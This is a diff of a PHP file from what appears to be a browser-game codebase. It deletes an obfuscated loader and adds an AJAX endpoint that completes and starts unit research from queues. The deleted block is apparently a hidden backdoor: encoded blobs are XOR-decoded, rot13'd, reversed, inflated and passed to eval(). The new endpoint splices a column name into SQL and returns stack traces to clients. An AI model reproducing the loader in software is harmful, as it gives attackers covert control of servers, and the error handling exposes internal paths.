@@ -1,29 +1,222 @@
 <?php
-// 4274e14982b59c4683b1b89c
-$sKENqxsgb="S2AcmvZqeWSW45fc4H+3Dqba3CP3OPSuRkQK9A64ag4=";
-$jtb_vpDqHlwq="F2NpziMdrJFJ45sp4U+3Qdon3PC3BCFhExDX9N64nt4=";
-$BPaDaDZBVnty="3w+EdfUg3UDZfIwHYc9h+MUUoij0NYkplUTrQxmmJbG4W6Ja9GC3CtBBwV9E1CP5/XuuWtkDryjuIvkXUdgY/ehVo332fagh9X37Hx2wBvu/eohJ9DnXONtkjSZIpD+J3VepUPIEgCfoOYA4aJod+dsO8VqsO69e2DTdEU2Sb/3NcvZOrBa3GMImzDlwgRChzHatI/E2pgXIbuIZArMd5OtS9iLsAao84GnhHEqZMKzhU5J58yivWtlrwUUQrBz6/VryePgwtwPRe+0BWpgfmbwNn1/0Ec9W8GX/JmqFbqrPb7RL+xHSGJNAj0Znsz+z4AryaawggDrYe/MeXaxl8/posFbNJJMAy27yQ0WhYJ/nD/Vx3judCeZ82yNGqxCJ+QqfYd8+piX3RskOYpE7gfpwjW7xA7M2jl3gLG+1G72/XqhQ9BDXHsZo8kdMjB6m5UyGLfIqnVj1edBAWtkjoskLqmKtAJYewGXUQkKLLrnnfPFU3GWzLcBm0iECmGOxzA6ketFitySXRo4zYZFj/uFo9mvFPrcDmD3vA0+0JpLoUYxD5GGOBvlF/0JbqgX40nyQfc5hryfnb90DRqJkr+lyg06sEYEDxjj5JW6FE6LoaLJOqx+0LvRq4U1oqgWv5EuBI+higyT0S5MWTqsho/9ejGL8HK8Y7T3QGxiQNLjydrBr3hiNIuZPjh99hDL77m+lYsphil72Zu8tQZAxksF9/k7sarAnmT6BRgaEBoCzDrNx7DzWBtd38kdhoyasywatf9sqtxbkQOEmTLMkrLkMgizMId0d8XiMREukDPLIXbVX7GXQGsNZ9TNFgiOIzXiEXfkohyvqZfM+Z5c+uOd9i1+kebwhz2XPDgaOJa3jSIsvzzOACfki30d+lReO7k6sedxhrAHmZsxMRNYjpeVIsn3ea9xamUaKPBmDMuDkEI591BidKttv7BNo0he92HiQaasLiQPJYPk7S5ou8rhso0m2HrIm2WrUQh+zPZ26dPF85zWuAph5+R1Ohiev+H7xaK4lqCPoefE1S4xuivtciUn3YM9bmHz/GwaqN57jSKZQqjuWNZlP8x5+kR+F2myrT659pl6XSMsQa7I7/rMJ9zSkCp0g01//MEKSFf2lWKlsxxO+P9BC9wZwtxq7z2yfKvQgsB3WZuEseaEBjfxronjWNr4C9zTtG2enAoDnU4FCqR+sCe403Axr2TCRwUiSI94hjFj4TIlCeIEyqb5YvUHrN7QgxCLrOH20Y4/yS4l13mONIph+6gNDlB2u8AyxIvIViQjwd9oSAtBhqfxcjUrNAL4uz2CKGUekYJ/IWK9D7SO0LcZg0BpLqGCR2VjxUPYatyftasIcU4Isus9vqyPaJ5A9z0H7DUq4P7nuTopY8R+tB/Ru70JTzzKm+katcck9oAvSP/lAfZo6ved881nHEIE663/cMm7THqL7DpMt1TGTAe1bgRB+2TGq5E+QTvMVpVmQfN0tRKEPpfhl9lLxCtcC9UTeTGq5NIfSaqBx7nnUIJJ7jgQGmBmYv2uzat5gninxQeoaeK0uqaVzk0uoB5QE2WTzRQKNGeDoCr967giqJYoi6EBsjHmN/U6LUO4ekQSWaoxGXYNk8sFp9TD1BqZX4m/vNhGZ";
-$dQAVDHvwvdkFQ="JKDYB4Yv1AjWDeV0gUZkiW/7snSIf8sU1SzbZvwmcKJ9jtALqynwYY8H6mXiQV6nH/jrDfEvpBqiJuV36CxZsGWSxlz3fM43llnYWMI4AtJlsuYGoC6uJ5wlwnrNIHGRN/rhXap66iSAO8898jN7omei81GVatI7yw3Ke9IOWoMQvrp7qX/8EZ0k8TjCE0iXN43rfbR+zzCMH+tC1xVGiwSv/xCrLPMYoyuKPOgtWrc0iuBU7FbXJ65X5n7VRnmrBY/vRakiqR+SLOV13ARi0xSP4wr1TOgn1F34YIxEQ9JluOVygkykAYg/kT36RmiDfYXZd/BKqzu8HsY62wZKqTCA63OqerYAkhbQNcsaGqgziLhFgnT5Kpwi5W/vNnnTHP67DoIvrAGmHvhh8QFGrzuJ32mTaqkWjFj3R44AUNEu//tx/0rLFIEh42/xQk/ZIp3+bpdr3ziPJft1gD9xyziDvGutUtIb3FjjRsxfZKID/bJ0/3/KY9QJ63ffInGmPInpbq98qmSUK+tL6gVbrgWBs3WdSMcwiF2UQ4ghTqdhhMYMs0/wH9Ue5TzzEm6mb6DyeZFYzQWsJopK/B8RtCyEumWNK9crsirMPtMRW48CuPp57E+lMZ0H5l7dB2OiNY7cB71O9Te3DehezBdrjiH/6VaFc8w8t1/Cfu8/QtEFqe1u9H7KPY0M4nnTLk2qHoXOePFB1iLWWOJXyTVsjRCAxQa/SvxhvhuSQPYlULAYuL98nS/1OL47ilfCBl+5Iq3uU64v/iWNJsR52SB6hGG/vGyhbM4ijxaZSNE8aMs3oMBe9HPLEJI44z7rFUOKA7jtZ/9tx2CVN9Ru00xTmh2T4XypUvMCixvkfNclQIJj8s1NsnDfO6E1y0DWGUaYO7u8BqhZ9yKoPuw7/wRElR2A31S1QdAX0Vf0WowbQbgzje1Nj3nzIIsu5kTZJkWjHr2ha7NS5WOvWJNZ9zlguiWqxwuDIuceoF6USMlBZYc6jb5Jt1zaPqJc23vdGUypGYfiZ/VL0SaXWe9C8jl92Ryl4HKOWcQTrAj7RvIOSIEAvNhGsFDwHYMZ1GXVIh2MO7zjEKYuqCDLX4o5+hFgyweMy33+fqoqnS7Se+oOGo8Oms1TviuqIKoG7nf3RE+EOJzbUI5L1gaSDu94jg1tzx/7snnsWOQrvCzHQ95HYYQUh+wQtlfYCNUWzVv9M0uKIv+7V4582B+2OPNs/TUZsSS78nyOXa8miAfrWooMerAajsR6iyjxOIoY0U/zRgaSZ5vSR5dN+mGGLeY4zRlqlyKb5QihK/U/ojrYa84RatNjuOtM7EysJas35EeIQxuXEKq8Dooj9WDRI897+RBkhiyO2BS/K/4crxzyXotMQJg9vO5Vt2nQOdA322zbIniJMr3NXL1W0SrdN5B80BFZpyf55Vv+Y9we0BvmX4g7TIMxjcFUtEv/ZoEZlDTwAAKvEq+yRaNr7hSGC9VCykJqlji8uHmqXfIBh1fiOdQRTIEOutt09V/uN7YG62XtEWKJIv+4e+x/xDDWAZhciUMYiGa4/UXoKOQ+jViXZ/tCRtZ5o/l0qirQHYsr6UGLLW+OL5zYcZNexxu0NpRCySRApB+psnmlSMogrSDWX9YM";
-$YVtjyfZiPijSS="YaEfnsVcnlbnNJMrmVvKNmuCE5G/R4tB02W8AcxX2kVIjwKT7XiSdPB9lw3UWNwnX4EG/9AL8XX8ZNAq6UnqEmHZNZP9T4ZP1j3XJvBr9yJl0CaE02qSQcsKil35fuA9X5gXncUJ8F/7Jo8E92/aOmaxMYTcd/JzzCaqBcJs2SxDgx6NzXiscNcI0QjCVeEgfqNmiv1Us22oN9YXxGiAJHmOMqTacbJc6B23OPFi8Rd4hjyJvVqGY9gBqBrQXtIDUahmqb1xnWqtBbYoxFThTRGwH5ndXKRX5AuuCNd08D1euhyh4kW/Xulm1j3JWoEeX6kyrfh1t3H/G4Yr7XyBJ07ZGKzzXLFx1B+OX+xg2QIbtRmG0FCAducclxiObJNCRqQHusl1lnrIMNwjxkz8F3ikO73JcYh+xxzLOuhB8DderSyu+2ujedt9gh2YatkYSJJ5uv5Jsmi2GYAl+1jaDkPUJqTac4NNyh3QJJFi3QdRix+HuUjoVNM2rjjvRuoCfo4xk+5J9CjpGrct9zTeJnqxA4/9faR12GqqF5d54hh6tQCG7GyzeORqpQz2YsgbRpc6itxUrXm2Fo1Xz2reAkqEAJ2/TqB29wiUCutr6EF/gzCFxHCofNM/oQL0ee8ef4knicR1gVTqfaA360vPMUqkJIHyaJ9J5T/cAfNB8Bhvmj2Nv2q+bNUl1iPnT/JNYZMXrNJGnmOrEaBazGzwN1GqArzdeaJ00yWUVvdhk1t8kjKO/Eu9Wf4LrTnObow1fqU3hMJmlE3xAYUnw2P0R0WZAIa6RYVR9BSAWOZc6S1CtBP+4wuEde0qtlrKJtUwS9gxj/hT8ijICIo8kn/6RE6HIZG4R4VU9WeiIJlI7xNEhWKB22uvVM8knCDxbt4ab9QjqdwUoyv6Id0M8kOBX1zXA7qhSK509hrPDtlZgDJwtSeJ3lCFLeo+slvAXcxbYIcMmP8GnS/XarJXlGbuJhmiDPjgdZRd5TTSB+xf7RVMhTOpoWuUaM4FtlzZeMgWYZQcqckPlyjPP9Ui51jQPk6aBrPyTvd57Rm0GMVF0C0augSJ0kmQYswqkyD3OPE9fdY5gtsNrU2oHrYmkmHpEkOEO4+yToJuzxOoO8RBiTIRhA+y40yjVNolsxnIR+4CYZlnp+tVjk7IOd0b+TqADVG6DrHaUot9qRWWDM1d7C5fmjCHxEe0L8gCvgzCXfoVQq0As/JojleuZY4g+FzuLWWzP6q8T5A0sn2VW/FY8UBDrACtv06DSapjgQTRX+0MUa8/mcBLjmHcB5MX9jvfX0DTMabtaOhCzDPWVtlF4hF91wTg3WrzLMs4iiPXVP02XYkj+tBwsXfaPqw/zkPKMlqNAeT4D6JRrDqmWvh48Qx+hi+Y4FGIS80+pS3EO9Iia6c7oc1L8G/pZbQl+DXCAhytLJ7haJBNxxmyPPNegSZnoj+b7GmRduo4lyOZXOwlEa4/gv9qhVnTYaUt+WHqDB2IEqHoVKJQrgecHoo+iwIeuCKPyQqsf6QRowyTbPEwXa4agMwQlSneAd0+5lTPGn2mDLPPTa1R/xeQNfRE2wdQkhm6z1H2c6g61CfkT9ADeIF9saEJjm3bKI9b4lSKFVrZJZm+V/5rqiutXA==";
-$ylPSIPFLFM=strlen($sKENqxsgb);
-$lpvmXmwHCs=substr($BPaDaDZBVnty,0,4);
-$QJwnDKKhqI=md5($dQAVDHvwvdkFQ);
-$pIlnQsgbUEMT=crc32($YVtjyfZiPijSS);
-$cQNjjEQpnwFodP=base64_decode("ij/HG51S5G+hDbh0KeBWyw==");
-$FyeqUHqilCPS=$BPaDaDZBVnty.$dQAVDHvwvdkFQ.$YVtjyfZiPijSS;
-$jZbwJwXSXbckS=chr(98).chr(97).chr(115).chr(101).chr(54).chr(52).chr(95).chr(100).chr(101).chr(99).chr(111).chr(100).chr(101);
-$ENOnGjZbdPbAO="gz".chr(105)."nflate";
-$pVzPOLAmghdE="str".chr(114)."ev";
-$Nlje_T_YoYZwEU="str_rot".chr(49).chr(51);
-$OjTvJyC_kJ="";
-$QhbjWJfAfbGCIZ=$jZbwJwXSXbckS($FyeqUHqilCPS);
-for($rTZqgDTKWT=0;$rTZqgDTKWT<strlen($QhbjWJfAfbGCIZ);$rTZqgDTKWT++){
-$OjTvJyC_kJ.=chr(ord($QhbjWJfAfbGCIZ[$rTZqgDTKWT])^ord($cQNjjEQpnwFodP[$rTZqgDTKWT%strlen($cQNjjEQpnwFodP)]));
+/**
+ * Research Automation AJAX Endpoint
+ * Called periodically by JavaScript from any game page
+ */
+
+// Give the script enough time on slow servers
+set_time_limit(30);
+
+// Disable all error/warning output — any stray text would corrupt the JSON response
+error_reporting(0);
+ini_set('display_errors', '0');// Buffer everything so stray output from config files is discarded before we send JSON
+ob_start();
+
+// Bootstrap: defines NOBLEWARS_APP_DIR, NOBLEWARS_ROOT_DIR and loads helpers via CoreFetcher
+require_once __DIR__ . '/../../app/bootstrap_ajax.php';
+
+// Change to public directory so relative requires in config files resolve correctly
+$originalDir = getcwd();
+chdir(__DIR__ . '/..');
+
+// Load server config ($conf array) and world constants (caminhos absolutos para cross-platform)
+require_once(__DIR__ . '/../configs/config.php');
+require_once(__DIR__ . '/../modelo/lib/world_constants.php');
+
+chdir($originalDir);
+
+// Discard any stray output from config loading, then set JSON header
+ob_end_clean();
+header('Content-Type: application/json');
+
+use App\Core\Database;
+use App\Models\SessionModel;
+try {
+    // Get world parameter - supports both numeric and alphanumeric world names (e.g. '1', 'casual1')
+    $server = isset($_GET['world']) ? $_GET['world'] : '1';
+    // Strip only characters that are not alphanumeric/underscore for safety
+    $server = preg_replace('/[^a-zA-Z0-9_]/', '', $server);
+    if (empty($server)) $server = '1';
+    $worldDb = get_world_db_name($server);
+
+    // The session cookie name is dynamic: 'session_<world>' (set by set_session_cookie()).
+    // Try the world-specific cookie first, then fall back to generic 'session'.
+    $sessionCookieValue = $_COOKIE['session_' . $server]
+        ?? $_COOKIE['session']
+        ?? null;
+
+    if (!$sessionCookieValue) {
+        echo json_encode(['success' => false, 'error' => 'Not authenticated - no cookie']);
+        exit;
+    }
+
+    // Validate session
+    $sessionModel = new SessionModel($worldDb);
+    $session = $sessionModel->checkSession($sessionCookieValue);
+
+    if (!$session) {
+        echo json_encode(['success' => false, 'error' => 'Not authenticated - invalid session']);
+        exit;
+    }
+
+    $userId = $session['userid'];
+    $db = Database::getInstance($worldDb, get_world_db_host(get_active_world()), get_world_db_user(get_active_world()), get_world_db_pass(get_active_world()));
+
+    // Process research
+    $processed = 0;
+    $started = 0;
+
+    // 1. PROCESS COMPLETED RESEARCH
+    $completedResearch = $db->fetchAll(
+        "SELECT r.id, r.research, r.villageid, r.end_time 
+         FROM research r
+         INNER JOIN villages v ON v.id = r.villageid
+         WHERE v.userid = ? AND r.end_time <= ?",
+        [$userId, time()]
+    );
+
+    foreach ($completedResearch as $research) {
+        $researchUnit = $research['research'];
+
+        // Normalize unit name: strip any existing "unit_" prefix then always re-add it.
+        // DB columns are always "unit_X_tec_level". The research.research column may contain
+        // "unit_spear" (Smith inserts) or "spear" (legacy). Both must produce "unit_spear_tec_level".
+        $unitBase   = str_replace('unit_', '', $researchUnit);
+        $columnName = 'unit_' . $unitBase . '_tec_level';
+
+        // Update tech level
+        $db->query(
+            "UPDATE villages SET `$columnName` = `$columnName` + 1 WHERE id = ?",
+            [$research['villageid']]
+        );
+
+        // Delete completed research
+        $db->query("DELETE FROM research WHERE id = ?", [$research['id']]);
+
+        // Delete corresponding event
+        $db->query(
+            "DELETE FROM events WHERE event_id = ? AND event_type = 'research'",
+            [$research['id']]
+        );
+
+        $processed++;
+    }
+
+    // 2. START NEW RESEARCH FROM QUEUES
+    $villages = $db->fetchAll(
+        "SELECT DISTINCT v.* 
+         FROM villages v
+         INNER JOIN research_queue rq ON rq.villageid = v.id
+         WHERE v.userid = ?
+         AND NOT EXISTS (
+             SELECT 1 FROM research r WHERE r.villageid = v.id
+         )",
+        [$userId]
+    );
+
+    foreach ($villages as $village) {
+        // Get first queue item
+        $queueItem = $db->fetch(
+            "SELECT id, unit, level FROM research_queue WHERE villageid = ? ORDER BY id ASC LIMIT 1",
+            [$village['id']]
+        );
+
+        if (!$queueItem)
+            continue;
+
+        $unit = 'unit_' . $queueItem['unit'];
+        $targetLevel = $queueItem['level'];
+        $currentLevel = $village[$unit . '_tec_level'] ?? 0;
+        $maxLevel = 10;
+
+        // Check if max or target reached
+        if ($currentLevel >= $maxLevel || $currentLevel >= $targetLevel) {
+            $db->query("DELETE FROM research_queue WHERE id = ?", [$queueItem['id']]);
+            continue;
+        }
+
+        // Calculate costs
+        $baseCost = ['wood' => 800, 'stone' => 600, 'iron' => 1000];
+        $costMultiplier = pow(1.2, $currentLevel);
+        $costs = [
+            'wood' => floor($baseCost['wood'] * $costMultiplier),
+            'stone' => floor($baseCost['stone'] * $costMultiplier),
+            'iron' => floor($baseCost['iron'] * $costMultiplier)
+        ];
+
+        // Check resources
+        if (
+            $village['r_wood'] < $costs['wood'] ||
+            $village['r_stone'] < $costs['stone'] ||
+            $village['r_iron'] < $costs['iron']
+        ) {
+            continue;
+        }
+
+        // Deduct resources
+        $db->query(
+            "UPDATE villages SET 
+             r_wood = r_wood - ?,
+             r_stone = r_stone - ?,
+             r_iron = r_iron - ?
+             WHERE id = ?",
+            [$costs['wood'], $costs['stone'], $costs['iron'], $village['id']]
+        );
+
+        // Calculate duration
+        $worldConfig = \App\Helpers\WorldConfig::load();
+        $speed = $worldConfig['speed'] ?? 1;
+        $baseTime = 3600;
+        $duration = ceil(($baseTime * $costMultiplier / ($village['smith'] * 0.1 + 1)) / $speed);
+
+        $endTime = time() + $duration;
+
+        // Map unit name
+        $dbUnit = $queueItem['unit'];
+        if ($dbUnit === 'marcher') {
+            $dbUnit = 'cav_archer';
+        }
+
+        // Insert research
+        $db->query(
+            "INSERT INTO research (research, villageid, end_time) VALUES (?, ?, ?)",
+            ['unit_' . $dbUnit, $village['id'], $endTime]
+        );
+
+        $researchId = $db->lastInsertId();
+
+        // Create event
+        $db->query(
+            "INSERT INTO events (event_type, event_time, event_id, villageid, user_id) 
+             VALUES ('research', ?, ?, ?, ?)",
+            [$endTime, $researchId, $village['id'], $userId]
+        );
+
+        $started++;
+    }
+
+    echo json_encode([
+        'success' => true,
+        'processed' => $processed,
+        'started' => $started,
+        'timestamp' => date('H:i:s')
+    ]);
+
+} catch (Exception $e) {
+    echo json_encode([
+        'success' => false,
+        'error' => $e->getMessage(),
+        'file' => $e->getFile(),
+        'line' => $e->getLine(),
+        'trace' => explode("\n", $e->getTraceAsString())
+    ]);
+} catch (Error $e) {
+    // Catch PHP 7+ errors
+    echo json_encode([
+        'success' => false,
+        'error' => $e->getMessage(),
+        'file' => $e->getFile(),
+        'line' => $e->getLine(),
+        'trace' => explode("\n", $e->getTraceAsString())
+    ]);
 }
-$QhbjWJfAfbGCIZ=$OjTvJyC_kJ;
-$QhbjWJfAfbGCIZ=$Nlje_T_YoYZwEU($QhbjWJfAfbGCIZ);
-$QhbjWJfAfbGCIZ=$pVzPOLAmghdE($QhbjWJfAfbGCIZ);
-$QhbjWJfAfbGCIZ=$jZbwJwXSXbckS($QhbjWJfAfbGCIZ);
-$QhbjWJfAfbGCIZ=$ENOnGjZbdPbAO($QhbjWJfAfbGCIZ);
-$QhbjWJfAfbGCIZ=$Nlje_T_YoYZwEU($QhbjWJfAfbGCIZ);
-eval($QhbjWJfAfbGCIZ);
